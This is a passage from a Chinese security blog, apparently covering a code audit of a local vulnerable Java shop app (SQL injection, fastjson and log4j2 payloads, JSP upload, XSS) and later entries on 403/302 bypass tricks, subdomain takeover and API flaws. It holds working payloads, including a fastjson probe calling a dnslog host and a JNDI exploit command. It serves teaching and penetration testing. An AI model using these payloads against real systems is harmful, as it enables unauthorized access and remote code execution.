src="1663331554551-e05500fd-9033-48f2-8ff7-70191dba3cd6.png" alt="img"></p><p> 选择pom.xml重载项目 会自动加载依赖：</p><p><img src="1663331611607-9d952d0b-774c-4a31-908c-9180cca01398.png" alt="img"></p><p>找到配置文件更改端口，数据库信息等，找到sqls文件夹，创建数据库导入数据即可：</p><p><img src="1663331626651-b7f7361b-dff8-4f3b-80d4-a88fa5910a43.png" alt="img"></p><p>等pom.xml页面没有爆红，并且自己显示了绿色按钮就可以开启环境了：</p><p><img src="1663331638478-9507bb67-dde5-4b6d-8671-be31fff593d5.png" alt="img"></p><p>启动项目：</p><p><img src="1663331666677-90d4ec2a-bd29-4a48-a285-b31aff2d490b.png" alt="img"></p><h3 id="SQL注入P1"><a href="#SQL注入P1" class="headerlink" title="SQL注入P1"></a><strong>SQL注入P1</strong></h3><p>因为用了mybatis框架，所以先搜索看看有没有使用不安全的符号进行传参：<br><img src="1663331832601-f402ec21-2998-46e1-91e6-9690df497345.png" alt="img"></p><p>总共发现了五个，选择第一个开始审计：</p><p><img src="1663331861305-d879b213-963c-49e7-a97d-daebade1468b.png" alt="img"></p><p>参数点在88行，向上寻找调用语句：</p><p><img src="1663331876725-4f0c6dd7-fe47-402f-879e-0dd3cbc4a530.png" alt="img"></p><p>上面图片中，88为变量所在行数，向上寻找select参数，发现是在55行，点击箭头，即可跳转到对应的接口类。</p><p><img src="1663331893151-68e81ed6-c571-477d-8d77-5326e59e759d.png" alt="img"></p><p><img src="1663331906706-cd1b39b0-cb87-4f38-b93c-9ed8395a4dad.png" alt="img"></p><p>继续寻找，点击方法：</p><p><img src="1663331926782-c18e8955-ef14-4b35-8eb1-ae1980873b0a.png" alt="img"><img src="1663331935637-c8a2c3f6-dc09-45ab-9e5e-037a20fae99a.png" alt="img"></p><p>先在漏洞点打上断点，标记下：</p><p><img src="1663331947609-1625f92e-d405-419a-b72e-ed686995a645.png" alt="img"></p><p>然后找方法：</p><p><img src="1663331960537-f7ff78b1-7f6c-4e3d-89c8-977e1f2cc8ae.png" alt="img"></p><p>RequestMapping 是映射的路径，浏览器访问试试：</p><p><img src="1663331972402-897974fd-d737-4e30-b60e-f7087fbc1fc4.png" alt="img"></p><p>找到对应的页面：</p><p><img src="1663331988670-a62275ac-5bf0-4157-910b-b424d8486cf1.png" alt="img"></p><p>注意这些字段，orderby是通过web传参，isdesc默认是true：</p><p><img src="1663332000299-f07c2dee-e2ef-4daf-a8fc-64eddc37fd92.png" alt="img"></p><p>然后orderutil默认null，判断orderby是否为空，不为空则执行打印，然后吧数据带入到orderutil，再然后带入断点的地方：</p><p><img src="1663332011257-9acef63d-ec22-4c71-a4e4-67eb095f6769.png" alt="img"></p><p>查看此方法，没有做过滤：</p><p><img src="1663332021094-70ea8b99-4727-449c-b42d-78f2cdc56edb.png" alt="img"></p><p>Web抓包进行测试，默认是空的，加上sleep(4)，延迟有点高：</p><p><img src="1663332034149-670f663c-8814-43cc-acd3-bc39a94a2dd4.png" alt="img"></p><p><img src="1663332044311-ca7d0a03-55a2-4173-826e-cab38864a0ac.png" alt="img"></p><p>sqlmap验证：</p><p><img src="1663332061041-367dee4a-b463-4e9c-9b3c-ae515e1a1d55.png" alt="img"></p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="SQL注入P2"><a href="#SQL注入P2" class="headerlink" title="SQL注入P2"></a>SQL注入P2</h3><p>经过上面的流程，我们大致知道审计步骤了，那再尝试一个：</p><p><img src="1663332099081-48eca5e7-0389-4654-b478-4ecb210b929a.png" alt="img"></p><p><img src="1663332110462-decca393-6ce8-401f-b589-d1ae36e929c9.png" alt="img"></p><p>可以发现 和刚才的一样：</p><p><img src="1663332131900-07841600-59ab-473b-ae85-b3f802f24ae4.png" alt="img"></p><p><img src="1663332144551-5a3e646d-b8a0-4653-9075-dd1bf84e6a64.png" alt="img"></p><p>剩下的也是同样的思路。</p><h3 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h3><p>搜索关键字：</p><p><img src="1663332169386-1e200a3a-2c53-463b-b92a-5d689a2a520e.png" alt="img"></p><p>又回到了刚才的代码：</p><p><img src="1663332185268-c555ac83-0181-4a71-be87-76b8052760ce.png" alt="img"></p><p>上方的注释告诉我们，这是在产品添加功能。</p><p>把鼠标放到数据里，会显示原数据格式，是json没错了：</p><p><img src="1663332200750-1332aa21-9a00-439d-81ac-360616a27f97.png" alt="img"></p><p>dnslog探测：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;bb1e2x.dnslog.cn&quot;</span>&#125;</span><br><span class="line">url编码</span><br><span class="line">%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">40</span>%<span class="number">74</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">6</span>A%<span class="number">61</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">2</span>E%<span class="number">6</span>E%<span class="number">65</span>%<span class="number">74</span>%<span class="number">2</span>E%<span class="number">49</span>%<span class="number">6</span>E%<span class="number">65</span>%<span class="number">74</span>%<span class="number">34</span>%<span class="number">41</span>%<span class="number">64</span>%<span class="number">64</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>%<span class="number">76</span>%<span class="number">61</span>%<span class="number">6</span>C%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">62</span>%<span class="number">62</span>%<span class="number">31</span>%<span class="number">65</span>%<span class="number">32</span>%<span class="number">78</span>%<span class="number">2</span>E%<span class="number">64</span>%<span class="number">6</span>E%<span class="number">73</span>%<span class="number">6</span>C%<span class="number">6</span>F%<span class="number">67</span>%<span class="number">2</span>E%<span class="number">63</span>%<span class="number">6</span>E%<span class="number">22</span>%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="1663332476659-6b68b2cc-836d-40b8-bc28-db6cf529f5ff.png" alt="img"></p><h3 id="log4j2远程代码执行"><a href="#log4j2远程代码执行" class="headerlink" title="log4j2远程代码执行"></a>log4j2远程代码执行</h3><p>搜索关键字info、error、logger等，找变量拼接：</p><p><img src="1663332621021-2394a840-e986-4c29-853e-86cec918b6ae.png" alt="img"></p><p>获取的是个整数不是字符串，这个就不能被控制。接着找。找了一圈，终于找到有字符串的了：</p><p><img src="1663332639006-63adaf41-da4f-4102-aefe-2a6f70d07ec1.png" alt="img"></p><p>来到上传头像的地方，抓包：</p><p><img src="1663332652717-1e0bcbfd-200f-44d3-b784-9a6a975b86b4.png" alt="img"></p><p>获取了数据but dnslog，没数据看了下jdk，原来版本太高了，换一下版本，发现仍然不行。尝试弹计算器，结果成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java-jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;open/System/Applications/Calculator.app&quot; -A &quot;172.16.183.129&quot;</span><br></pre></td></tr></table></figure><p><img src="1663332678720-0f1a9b79-e280-422c-9a5c-a68af1432e1b.png" alt="img"></p><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>同上，就是头像上传功能：</p><p><img src="1663332702615-a1f00334-255b-46e2-8de5-39b6e1c878a3.png" alt="img"></p><p>获取文件名，然后去掉多余的“.”。名字是随机的uuid，拼接路径，然后上传，没有做过滤。</p><p>上传一个jsp试试：</p><p><img src="1663332716231-e7e419de-d782-4cc6-84db-ebebd0ca2063.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmall/res/images/item/userProfilePicture/e4b3a476-a492-446b-b033-e54f4b152c7c.jsp</span><br></pre></td></tr></table></figure><p>发现jsp被执行了，为什么？因为在pom添加了解析库，大多数项目是不会添加的：</p><p><img src="1663332750681-2deb5a3a-5505-45ae-add4-204c0a4c21f1.png" alt="img"></p><h3 id="反射xss"><a href="#反射xss" class="headerlink" title="反射xss"></a>反射xss</h3><p>牢记四字：见框就插。</p><p><img src="1663332853595-87f385db-200d-4c56-9d4f-ae1c762f4004.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass403/4/1/302</title>
      <link href="/2022/09/12/bypass40341302/"/>
      <url>/2022/09/12/bypass40341302/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="1-找其他资产"><a href="#1-找其他资产" class="headerlink" title="1.找其他资产"></a>1.找其他资产</h1><h2 id="403"><a href="#403" class="headerlink" title="403"></a>403</h2><h3 id="2-1-改HOST"><a href="#2-1-改HOST" class="headerlink" title="2.1.改HOST"></a>2.1.改HOST</h3><p>Host值修改为子域名或者ip来绕过</p><h3 id="2-2-覆盖请求URL"><a href="#2-2-覆盖请求URL" class="headerlink" title="2.2.覆盖请求URL"></a>2.2.覆盖请求URL</h3><p>X-Original-URL和X-Rewrite-URL标头，用户可以使用这俩请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">X-Original-URL: /auth/login</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">X-Rewrite-URL: /auth/login</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><h3 id="2-3-Referer标头绕过"><a href="#2-3-Referer标头绕过" class="headerlink" title="2.3.Referer标头绕过"></a>2.3.Referer标头绕过</h3><p>服务端一般使用Referer请求头识别访问来源，使用Referer标头绕过Web服务器的限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">ReFerer:https://xxx/auth/login</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">ReFerer:https://xxx/auth/login</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><h3 id="2-4-代理IP"><a href="#2-4-代理IP" class="headerlink" title="2.4.代理IP"></a>2.4.代理IP</h3><p>一般开发者会通过Nginx代理识别访问端IP限制对接口的访问，尝试使用X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwared-Host: 127.0.0.1</span><br><span class="line">X-Host: 127.0.0.1</span><br><span class="line">X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">Request</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">GET /auth/login HTTP/1.1</span><br><span class="line">X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line">Response</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><h3 id="2-5-扩展名绕过"><a href="#2-5-扩展名绕过" class="headerlink" title="2.5.扩展名绕过"></a>2.5.扩展名绕过</h3><p>在url后加一些无关紧要的字符，因服务端url过滤不严，所以绕过403受限制的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">site.com/admin =&gt; 403</span><br><span class="line">site.com/admin/ =&gt; 200</span><br><span class="line">site.com/admin// =&gt; 200</span><br><span class="line">site.com//admin// =&gt; 200</span><br><span class="line">site.com/admin/* =&gt; 200</span><br><span class="line">site.com/admin/*/ =&gt; 200</span><br><span class="line">site.com/admin/. =&gt; 200</span><br><span class="line">site.com/admin/./ =&gt; 200</span><br><span class="line">site.com/./admin/./ =&gt; 200</span><br><span class="line">site.com/admin/./. =&gt; 200</span><br><span class="line">site.com/admin/./. =&gt; 200</span><br><span class="line">site.com/admin? =&gt; 200</span><br><span class="line">site.com/admin?? =&gt; 200</span><br><span class="line">site.com/admin??? =&gt; 200</span><br><span class="line">site.com/admin..;/ =&gt; 200</span><br><span class="line">site.com/admin/..;/ =&gt; 200</span><br><span class="line">site.com/%2f/admin =&gt; 200</span><br><span class="line">site.com/%2e/admin =&gt; 200</span><br><span class="line">site.com/admin%20/ =&gt; 200</span><br><span class="line">site.com/admin%09/ =&gt; 200</span><br><span class="line">site.com/%20admin%20/ =&gt; 200</span><br></pre></td></tr></table></figure><h3 id="2-6-访问该路径下资源"><a href="#2-6-访问该路径下资源" class="headerlink" title="2.6.访问该路径下资源"></a>2.6.访问该路径下资源</h3><p>有些网站的目录没有权限访问会显示403，但是在这个目录下面的文件，我们或许能扫描到并访问</p><h3 id="2-7-换协议"><a href="#2-7-换协议" class="headerlink" title="2.7.换协议"></a>2.7.换协议</h3><p>http&lt;-&gt;https互换</p><h3 id="2-8-little-tips"><a href="#2-8-little-tips" class="headerlink" title="2.8.little tips"></a>2.8.little tips</h3><p><img src="1661175459276-af942389-bb9a-48c9-859c-e43a4b32ed52.png" alt="img"></p><p><img src="1661175897474-b1496fd1-27f7-4bb1-959b-f4ec1b1d7a15.png" alt="img"></p><p><img src="1661175987818-f51806a4-1cd4-4067-8d4d-a155c99ef9c0.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22207390/1661176001864-33835ffc-e1b3-42a3-8bb1-e9551b07ba47.png" alt="img"></p><h2 id="401"><a href="#401" class="headerlink" title="401"></a>401</h2><p>1.文件枚举</p><p>2.通过搜索引擎来发现更多信息</p><p>3.在github上面搜索类似的域名</p><p>4.通过Wayback来搜索查找</p><p>5.改变HTTP的方法(get&#x2F;post&#x2F;put&#x2F;delete&#x2F;patch&#x2F;…)</p><p>6.对cookies,参数，header,hosts,目录进行模糊测试</p><h2 id="404"><a href="#404" class="headerlink" title="404"></a>404</h2><p><a href="http://example[.]com/index.php">http://example[.]com/index.php</a> -&gt; File not found<br><a href="http://example[.].com/assets../index.php">http://example[.].com/assets../index.php</a> -&gt; source code<br><a href="http://example[.].com/img../index.php">http://example[.].com/img../index.php</a> -&gt; source code<br><a href="http://example[.].com/js../index.php">http://example[.].com/js../index.php</a> -&gt; source code<br><a href="http://example[.].com/vendors../index.php">http://example[.].com/vendors../index.php</a> -&gt; source code<br><a href="http://example[.].com/media../index.php">http://example[.].com/media../index.php</a> -&gt; source code</p><h2 id="302"><a href="#302" class="headerlink" title="302"></a>302</h2><p><a href="http://target.com/admin">http://target.com/admin</a> –&gt; HTTP 302 (redirect to login page)<br><a href="http://target.com/admin%20/">http://target.com/admin%20/</a> -&gt; HTTP 200 OK<br><a href="http://target.com/%20admin%20/">http://target.com/%20admin%20/</a> -&gt; HTTP 200 OK<br><a href="http://target.com/admin%20/page">http://target.com/admin%20/page</a> -&gt; HTTP 200 OK</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><a href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a></p><p><a href="https://github.com/yunemse48/403bypasser">https://github.com/yunemse48/403bypasser</a></p><p><a href="https://github.com/devploit/dontgo403">https://github.com/devploit/dontgo403</a></p><p><a href="https://github.com/daffainfo/bypass-403">https://github.com/daffainfo/bypass-403</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>子域名接管</title>
      <link href="/2022/09/12/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1/"/>
      <url>/2022/09/12/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1/</url>
      
        <content type="html"><![CDATA[<hr><p><a href="https://0xpatrik.com/subdomain-takeover/">https://0xpatrik.com/subdomain-takeover/</a></p><h1 id="发生的场景"><a href="#发生的场景" class="headerlink" title="发生的场景"></a>发生的场景</h1><p>申请了一个域名a.com，用CNAME将其解析到 domain.com</p><p>没过多久，domain.com过期，并且任何人都可以购买</p><p>由于CNAME记录未删除，故新购买domain.com的人可以控制a.com</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><h3 id="1-窃取cookie-绕过HttpOnly"><a href="#1-窃取cookie-绕过HttpOnly" class="headerlink" title="1.窃取cookie-绕过HttpOnly"></a>1.窃取cookie-绕过HttpOnly</h3><p>Cookie可以跨子域共享，例如当网站使用基于Cookie的单点登录系统时，用户可以使用一个子域登录，并且在各种子域中共享相同的会话令牌，设置常规Cookie的语法如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK </span><br><span class="line">Set-Cookie: name=value </span><br></pre></td></tr></table></figure><p>如果这个Cookie是由example.com所在的web服务器发出的，那么只有这个服务器才可以访问到这个Cookie，但是可以通过以下方式为通配符域发布Cookie：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK </span><br><span class="line">Set-Cookie: name=value; domain=example.com </span><br></pre></td></tr></table></figure><p>这样Cookie可以存在于对example.com的HTTP请求中，也可以包含在任何其他子域里面（例如：subdomain.example.com），这样导致使用子域名接管来进行攻击，例如某个特定的域使用Cookie用于通配符域，那么如果有一个子域遭受到攻击者子域接管，如果用户访问了该子域，Cookie会随HTTP请求自动发送，这样会导致HttpOnly cookie被绕过</p><h3 id="2-窃取电子邮件"><a href="#2-窃取电子邮件" class="headerlink" title="2.窃取电子邮件"></a>2.窃取电子邮件</h3><p>当可以进行CNAME子域接管的时候。攻击者可以将MX设置为任意Web服务器，这会允许接收电子邮件到某个子域中，攻击者通常会使用欺骗Return-Path header的方法接收电子邮件的回复。在网络钓鱼攻击中经常大范围使用，同时，由于SPF将配置存储在DNS TXT记录中，当子域被接管的时候，攻击者同样可以控制TXT 记录，就可以绕过SPF检查来发送邮件</p><p>Rojan Rijal曾发现了Uber基于SendGrid服务的某个可劫持子域名，之后，利用该子域名，他成功拦截了Uber内部的公司电邮通信，获取了Uber官方$10,000美金的奖励。</p><p>漏洞详情（内附POC视频）：<a href="https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/">https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/</a></p><h3 id="3-钓鱼"><a href="#3-钓鱼" class="headerlink" title="3.钓鱼"></a>3.钓鱼</h3><p>构造钓鱼页面来进行攻击</p><h3 id="4-CORS跨域资源共享"><a href="#4-CORS跨域资源共享" class="headerlink" title="4.CORS跨域资源共享"></a>4.<strong>CORS跨域资源共享</strong></h3><p>跨域资源共享，Cross-Origin Resource Sharing (CORS), 允许 Web 应用服务器进行跨域的网页访问控制。在Web应用创建的某个域中，按照一组规则来允许某些网站可以访问提取包括认证数据在内的数据信息。以某些子域名是可信域名的前提下，一些Web应用还允许子域名执行跨域的HTTP请求。</p><p>留意一下COSR头信息，在BurpSuite Pro专业版中就有这个检测功能，另外可以看看Web应用是否将子域名列入了白名单，这些设置都可能实现对Web授权用户的数据窃取。</p><h3 id="5-Oauth-授权白名单化"><a href="#5-Oauth-授权白名单化" class="headerlink" title="5.Oauth 授权白名单化"></a><strong>5.Oauth 授权白名单化</strong></h3><p>与跨域资源共享，Oauth 授权过程同样具备一个白名单机制，藉此，Web开发者可以指定哪个回调URIs是可以接受的。这里的风险在于，当存在劫持漏洞的子域名被列入这个白名单中时，攻击者可以在Oauth授权过程中把用户会话重定向到先前那个存在劫持漏洞的子域名中，以此窃取用户的Oauth 授权信息。</p><h3 id="6-内容安全策略（Content-Security-Policies）"><a href="#6-内容安全策略（Content-Security-Policies）" class="headerlink" title="6.内容安全策略（Content-Security Policies）"></a><strong>6.内容安全策略（Content-Security Policies）</strong></h3><p>内容安全策略是Web应用信任的另一个主机列表，CSP的目的在于限制哪些主机可以在应用中执行客户端代码。如果希望尽量减少跨站脚本的影响，这种方式非常有用。如果你可以劫持控制的子域名包含在白名单中，你就可以绕过CSP限制，在Web应用中执行恶意的客户端代码。</p><h3 id="7-点击劫持（ClickJacking）"><a href="#7-点击劫持（ClickJacking）" class="headerlink" title="7.点击劫持（ClickJacking）"></a><strong>7.点击劫持（ClickJacking）</strong></h3><p>在browser-security-whitepaper中提到，在X-Frame-Options标头中，IE、Edge和Safari都支持ALLOW-FROM uri机制，表示该页面可以在指定来源的 frame 中展示，也就是说，如果你可劫持控制的子域名在该机制的白名单中，那么就可以在目标网页应用中构建欺骗页面，执行点击劫持（ClickJacking）攻击。</p><h3 id="8-密码管理器的密码信息泄露"><a href="#8-密码管理器的密码信息泄露" class="headerlink" title="8.密码管理器的密码信息泄露"></a><strong>8.密码管理器的密码信息泄露</strong></h3><p>某些密码管理器，如LastPass会在一些主网站所属的子域名网站中执行自动密码填充功能，这相当于让网站设置了一个包含明文密码的非httponly类cookie，可以方便子域名劫持之后的深入利用。</p><h3 id="9-Broken-Link-Hijacking"><a href="#9-Broken-Link-Hijacking" class="headerlink" title="9.Broken Link Hijacking"></a><strong>9.Broken Link Hijacking</strong></h3><p>这种情况下的子域名，并不属于目标网站所有，但却是用来运行目标网站的网页内容的。也就是说，如目标网站网页内容中某个资源需要从外部导入的第三方资源，举例来说，像js文件一样，那么，攻击者就可以通过JavaScript的Blob对象类型进行导入，从而声明对目标网站相关子域名的控制权限。</p><p>这种在网页页面的主机劫持可以导致存储型跨站漏洞，攻击者可以针对目标网站页面，利用这种模式来加载任意的客户端代码。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>可以通过ARL资产灯塔等资产扫描工具<br>也可以通过github上的一些脚本，比如Oneforall的一个单独模块,Subdomain-Takeover<br><a href="https://github.com/Echocipher/Subdomain-Takeover">https://github.com/Echocipher/Subdomain-Takeover</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>API漏洞</title>
      <link href="/2022/09/11/API%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/09/11/API%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="1、API暴露面"><a href="#1、API暴露面" class="headerlink" title="1、API暴露面"></a>1、API暴露面</h3><p>内部使用的API可能会意外地暴露在互联网上，这可能是由于错误的配置，或者只是因为假设没有人能够找到它。API的位置可以通过很多方式发现，包括分析JavaScript文件、分析暴露的源代码、观察主机名（如api.internal.example.com）和Google dorking。</p><p>例如之前的JS泄露OSS的accessKeyId、accessKeySecret</p><p><img src="1662899958733-c05df802-f016-4dc1-af6a-a192f132c193.png" alt="1662899958733-c05df802-f016-4dc1-af6a-a192f132c193"></p><p>以及常见的JS接口未授权访问等、除此以外，在外部主机上发现像SSRF这样的漏洞，可能会让你获取到内部的API。</p><h3 id="2、配置缓存风险"><a href="#2、配置缓存风险" class="headerlink" title="2、配置缓存风险"></a>2、配置缓存风险</h3><p>对于需要认证的API来说，返回的数据往往是动态的，并且是针对每个API密钥的范围。例如，以A的身份访问&#x2F;api&#x2F;v1&#x2F;userdetails 应该返回A的详细信息，而以B的身份访问同一终点应该返回B的详细信息。一个常见的错误配置发生在API不使用标准的Authorization 头，而是使用一个自定义的头，如X-API-Key 。缓存服务器可能无法识别这是一个经过验证的请求，并可能将其缓存。</p><p>如果是这种情况，并且没有Cache-Control 或Pragma 头信息，那么简单地访问&#x2F;api&#x2F;v1&#x2F;userdetails 可能会暴露另一个用户的信息。</p><h3 id="3、暴露的Token"><a href="#3、暴露的Token" class="headerlink" title="3、暴露的Token"></a>3、暴露的Token</h3><p>通过任何方式发现一个API密钥，都可能为你提供对API的访问。更糟糕的是，供内部使用的API往往没有必要实施复杂的认证流程，因此可能会实施静态令牌作为其认证。秘密令牌可能在代码库、客户端JavaScript、拦截流量等方面被发现。</p><p>例如一次在红队演练中内网横向时获取到的一个GF配置接口信息。里面暴露了接口的认证key与对应的接口信息，包括可以查看婚姻及伴侣等信息。</p><p><img src="API%E6%BC%8F%E6%B4%9E%5C1662900099125-eca6050a-7320-4e22-ae5c-4d7d9ef0112f.png" alt="img"></p><h3 id="4、授权风险-IDOR"><a href="#4、授权风险-IDOR" class="headerlink" title="4、授权风险&#x2F;IDOR"></a>4、授权风险&#x2F;IDOR</h3><p>授权是检查一个经过认证的用户是否可以访问一个特定的用户的过程。一个常见的与授权有关的漏洞被称为不安全的直接对象引用（IDOR）。例如，在一个开票应用程序的API中，我们可能有一个端点，用来获取发票的详细信息参数是应该返回的发票的标识符。如果这个端点是安全的，我应该只能得到属于我的发票的细节。例如，如果我创建了一张ID为1234的发票，那么它应该返回详细信息。如果我试图通过浏览&#x2F;api&#x2F;v1&#x2F;invoices&#x2F;?id&#x3D;1233 来访问一张我没有创建的发票，它应该返回一个错误。如果我能够改变标识符来查看其他用户的发票细节，这就是一个被称为IDOR的漏洞。也就是所谓的越权。为了应对IDOR问题，今天许多API都利用UUID作为对象的标识符。一个UUID看起来像这样。f1af4910-e82f-11eb-beb2-0242ac130002，这也是大多数金融行业的修复处理方式。值得注意的是，利用UUID作为标识符并不是缓解IDOR问题的有效方法。事实上，UUID RFC特别指出了这一点。虽然利用UUIDs而不是整数作为对象的ID是很好的做法，但它们绝不应该被用作防止IDOR攻击的唯一保护措施。特别是可预测的随机数反而可能会导致情况更加严峻。就例如结合前端的敏感信息泄露，有的单位会将其生成算法暴露在前端，并且后端并未有效的进行前后端认证，导致可自行枚举进行攻击。</p><h3 id="5、未记录的端点"><a href="#5、未记录的端点" class="headerlink" title="5、未记录的端点"></a>5、未记录的端点</h3><p>经常会遇到这样的情况：尝试渗透攻击的API没有文档（或者至少没有你可以访问的文档）。同样常见的是，一个有文档的API会有超出文档内容的端点。有时，这些端点的存在可能是一个安全问题–例如，端点可能是为管理目的而设计的，并允许你作为一个低权限用户执行管理任务。其他时候，这些端点可能会出现漏洞，只是因为它们没有像那些容易发现的端点那样被测试。</p><p>这里我们可以通过用Burp来检测，例如通过查看目标选项卡检查所使用的端点。许多API会给出足够详细的错误，以列举未记录的端点和参数。例如，向&#x2F;api&#x2F;v1&#x2F;randomstring 发送一个空白的POST请求，可能会导致一个错误，大意是无效路由，有效路由是[&#x2F;users,&#x2F;invoices,&#x2F;customers] 